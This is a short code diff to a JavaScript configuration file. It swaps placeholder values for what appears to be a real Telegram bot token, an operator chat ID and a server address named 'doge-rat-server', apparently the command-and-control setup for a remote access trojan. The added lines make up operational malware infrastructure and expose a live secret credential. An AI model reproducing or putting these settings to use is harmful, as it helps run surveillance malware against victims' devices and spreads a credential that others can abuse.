@@ -1,5 +1,5 @@
 module.exports = {
-  token: "YOUR_TELEGRAM_BOT_TOKEN",
-  id:"Enter Your Id",
-  address:"Enter your url"
+  token: "8549358187:AAFWADEIpzlmgVsqZZtLn5g3-Ppk4tOpQ0Y",
+  id:"7770087246",
+  address:"https://doge-rat-server-doge-rat-server.up.railway.app/"
 };
